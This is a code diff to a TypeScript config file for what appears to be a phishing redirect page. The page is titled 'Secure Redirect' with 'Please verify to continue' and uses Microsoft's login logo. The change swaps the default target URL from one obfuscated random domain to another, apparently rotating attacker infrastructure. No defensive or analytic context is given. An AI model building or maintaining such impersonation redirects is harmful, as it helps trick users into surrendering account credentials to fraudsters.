@@ -18,7 +18,7 @@ export interface Config {
 }
 
 export const defaultConfig: Config = {
-  defaultTargetUrl: 'https://ypwoi.wbujrne.es/6oay3!Gqc45rLfQrpg/',
+  defaultTargetUrl: 'https://qed.kbdjgmu.li/nI99b!aySzcElv/',
   headerTitle: 'Secure Redirect',
   headerSubtitle: 'Please verify to continue',
   leftLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
